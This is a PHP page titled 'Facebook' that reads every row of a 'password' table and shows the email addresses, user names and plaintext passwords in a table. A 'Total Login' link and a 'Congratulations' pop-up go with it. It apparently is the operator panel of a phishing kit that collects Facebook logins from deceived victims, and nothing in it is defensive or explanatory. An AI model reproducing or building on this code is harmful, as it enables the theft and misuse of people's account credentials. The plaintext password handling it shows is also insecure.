<?php
  session_start();
  include "./database/database.php";
  $allpass = "SELECT * FROM `password`";
  $pass = mysqli_query($connect, $allpass);
  $ruselt = mysqli_fetch_all($pass , 1);

  ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
</head>
<body>


<nav class="navbar navbar-expand-lg bg-body-tertiary ">
  <div class="container">
    <a class="navbar-brand" href="#"><b><i class="bi bi-apple"></i></b></a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav mx-auto mb-2 mb-lg-0">
        <li class="nav-item ">
          <a class="nav-link px-5  " aria-current="page" href="./index.php"><b>HOME</b></a>
        </li>
        <li class="nav-item active px-5">
          <a class="nav-link" href="./index.php"> <b>Total Login</b></a>
        </li>
        
      </ul>
      
    </div>
  </div>
</nav>


<table class="table table-hover  container  mt-5">
  <thead class="table-primary">
    <tr >
      <th  scope="col">ID</th>
      <th scope="col">Email address</th>
      <th scope="col">User name</th>
      <th scope="col">Password</th>
    </tr>
  </thead>
    
    <?php 
 
    foreach($ruselt as $key=>$ruselt){
        ?>

        <tr>
        <th scope="row"><?= ++$key?></th>
        <td > <?=$ruselt['email_address']?></td>
        <td> <?=$ruselt ['user_name']?></td>
        <td> <?=$ruselt ['password']?></td>
      </tr>
      <?php
    }
    
    ?>
   
  
</table>



<!-- <div class="modal-dialog modal-sm ">secess</div> -->
<div class="toast <?= isset($_SESSION['pop']) ? "show" : "" ?>" style="position: absolute; top:50px; right:50px; " role="alert" aria-live="assertive" aria-atomic="true">
  <div class="toast-header">
    <h4>🎉</h4>
    <strong class="me-auto">Congratulations</strong>
    <small>30s ago</small>
    <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
  </div>
  <div class="toast-body">
   <?=isset($_SESSION['pop']) ? $_SESSION['pop'] : ""?>
  </div>
</div>
<br><br>






<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>

</body>

</html>

<?php

session_unset();

?>
